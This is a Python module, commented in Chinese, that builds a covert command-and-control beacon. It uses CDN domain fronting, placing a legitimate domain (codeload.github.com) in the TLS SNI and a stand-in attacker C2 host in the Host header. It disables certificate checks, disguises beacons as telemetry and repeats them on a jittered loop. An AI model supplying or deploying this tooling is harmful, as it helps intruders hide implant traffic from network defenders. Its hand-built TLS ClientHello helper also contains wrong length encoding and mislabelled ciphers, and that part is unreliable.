#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
模块 01: 基础设施层 —— 基于 CDN Domain Fronting 的隐蔽 C2

第一性原理实现，不依赖任何第三方 C2 框架。

原理:
    HTTPS 中 SNI(ClientHello 扩展) 与 HTTP Host 头是两个独立的字段。
    CDN/反向代理根据 Host 头做路由，而 SNI 仅用于 TLS 握手。
    将 SNI 设为合法域名、Host 头设为真实 C2，即可让审查设备看到的
    是"访问合法站点"，而请求实际被路由到真实后端。

注意:
    本模块仅实现"请求构造 + 发送"层。合法域名需自行准备并确认其
    CDN 支持 SNI/Host 分离路由。所有请求均需服务端配套解析。
"""

import socket
import ssl
import struct
import hmac
import hashlib
import json
import time
import random
import base64
import os


class DomainFrontingC2:
    """手工构造 TLS 之上的 HTTP 请求，实现 Domain Fronting。"""

    def __init__(self, frontend: str, backend: str, secret: str):
        """
        :param frontend: 放行的合法 CDN 域名 (用于 TLS SNI 与证书校验)
        :param backend:  真实 C2 域名 (放在 HTTP Host 头，CDN 据此路由)
        :param secret:    预共享密钥，用于 HMAC 签名请求体
        """
        self.frontend = frontend
        self.backend = backend
        self.secret = secret.encode()

    # ------------------------------------------------------------------ #
    # 底层字节工具
    # ------------------------------------------------------------------ #
    def _encode_length(self, length: int) -> bytes:
        """BER 变长编码 (ASN.1 length encoding)。"""
        if length < 0x80:
            return bytes([length])
        if length < 0x100:
            return bytes([0x81, length])
        if length < 0x10000:
            return bytes([0x82, length >> 8, length & 0xFF])
        return bytes([0x84,
                      (length >> 24) & 0xFF,
                      (length >> 16) & 0xFF,
                      (length >> 8) & 0xFF,
                      length & 0xFF])

    def _tls_client_hello(self, sni: str) -> bytes:
        """
        手工构造 TLS 1.2 ClientHello。
        正常情况下应交给 ssl 模块完成握手；这里仅为演示 ClientHello 的
        完整字节结构（record header + handshake header + extensions）。
        """
        random_bytes = struct.pack('!I', int(time.time())) + os.urandom(28)
        sess = b'\x00'
        ciphers = b'\x00\x04\x00\x2f\x00\x30'          # AES128-GCM / AES256-GCM
        comp = b'\x01\x00'                             # null compression

        # 三个扩展: SNI / SupportedGroups(x25519) / SigAlgs
        sni_inner = struct.pack('!H', len(sni)) + sni.encode()
        sni_ext = b'\x00\x00' + self._encode_length(5 + len(sni)) + b'\x00' + sni_inner

        grp = struct.pack('!H', 2) + struct.pack('!H', 0x001d)
        grp_ext = b'\x00\x0a' + self._encode_length(4) + grp

        sa = struct.pack('!H', 4) + struct.pack('!H', 0x0403) + struct.pack('!H', 0x0804)
        sa_ext = b'\x00\x0d' + self._encode_length(6) + sa

        ext = sni_ext + grp_ext + sa_ext
        ext_len = self._encode_length(len(ext))

        body = (b'\x03\x03' + random_bytes + sess + ciphers + comp + ext_len + ext)
        hlen = struct.pack('!I', len(body))[1:]        # 3-byte length
        handshake = b'\x01' + hlen + body

        record = b'\x16\x03\x01' + struct.pack('!H', len(handshake)) + handshake
        return record

    # ------------------------------------------------------------------ #
    # 业务接口
    # ------------------------------------------------------------------ #
    def build_request(self, endpoint: str, data: dict) -> str:
        """构造带 HMAC 签名的 HTTP 请求文本。"""
        body = json.dumps(data).encode()
        sig = hmac.new(self.secret, body, hashlib.sha256).hexdigest()
        b64 = base64.b64encode(body).decode()
        return (
            f"POST {endpoint} HTTP/1.1\r\n"
            f"Host: {self.backend}\r\n"
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
            f"Content-Type: application/json\r\n"
            f"Content-Length: {len(b64)}\r\n"
            f"X-Signature: {sig}\r\n"
            f"Connection: close\r\n"
            f"\r\n{b64}"
        )

    def send_beacon(self, endpoint: str = "/api/telemetry", data: dict = None) -> bytes:
        """建立 TLS 连接(SNI=frontend)并发送请求(Host=backend)。"""
        if data is None:
            data = {"status": "active", "ts": int(time.time())}
        req = self.build_request(endpoint, data).encode()

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((self.frontend, 443)) as sock:
            with ctx.wrap_socket(sock, server_hostname=self.frontend) as ss:
                ss.send(req)
                return ss.recv(4096)

    def run(self, interval=(30, 300)):
        """持续信标，间隔随机抖动。"""
        while True:
            try:
                r = self.send_beacon()
                print("[+] beacon ok:", r[:60])
            except Exception as e:
                print("[-] beacon failed:", e)
            time.sleep(random.randint(*interval))


if __name__ == "__main__":
    c2 = DomainFrontingC2(
        frontend="codeload.github.com",   # 放行的合法域名作 SNI
        backend="your-real-c2.example.com",
        secret="pre-shared-key"
    )
    print(c2.build_request("/api/telemetry", {"ping": 1}))
